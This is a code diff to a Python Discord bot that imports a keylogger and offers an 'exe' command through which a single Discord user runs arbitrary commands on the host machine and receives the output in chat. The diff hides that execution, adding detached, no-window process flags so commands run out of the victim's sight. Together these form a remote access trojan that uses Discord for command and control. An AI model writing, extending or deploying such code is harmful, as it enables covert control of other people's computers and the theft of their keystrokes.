@@ -5,7 +5,7 @@ from Logger import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'BOT_TOKEN'
+TOKEN = 'TOKEN'
 
 intent = discord.Intents.all()
 intent.message_content = True
@@ -114,9 +114,16 @@ async def exe(ctx: commands.Context,*, cmd: str = None):
         if ctx.author.id != 1434492547409117264:
             ctx.send("cannot run command, only author")
             return
-        
-        result = subprocess.run(["powershell", cmd], shell=True, text=True, capture_output=True, timeout=30)
-        res = result.stdout if result.returncode == 0 else result.stderr
+
+        DETACHED_PROCESS = 0x00000008
+        CREATE_NEW_PROCESS_GROUP = 0x00000200
+        CREATE_NO_WINDOW = 0x08000000
+
+        flag = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
+
+        result = subprocess.Popen(cmd, creationflags=flag, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
+        stdout, stderr = result.communicate()
+        res = stdout if result.returncode == 0 else stderr
 
         if not res or res.strip() == "":
             return await ctx.send("```[NO OUTPUT]```")
@@ -126,13 +133,12 @@ async def exe(ctx: commands.Context,*, cmd: str = None):
             await ctx.send(f"{prefix} ```\n{res}\n```")
         else:
             buffer = io.BytesIO(res.encode())
-            file = "output.txt" if result.returncode == 0 else "error.txt"
-            
+            buffer.seek(0)
+            filename = "output.txt" if result.returncode == 0 else "error.txt"
             await ctx.send(
-                content="output is too long, download it via file",
-                file=discord.File(fp=buffer, filename=file)
+                content="ouput is too long, see it in this file:",
+                file=discord.File(fp=buffer, filename=filename)
             )
-
     except subprocess.TimeoutExpired:
         await ctx.send(f"**TERMINAL ERROR:** ```program stopped because of timeout 30sec```")
     except Exception as e:
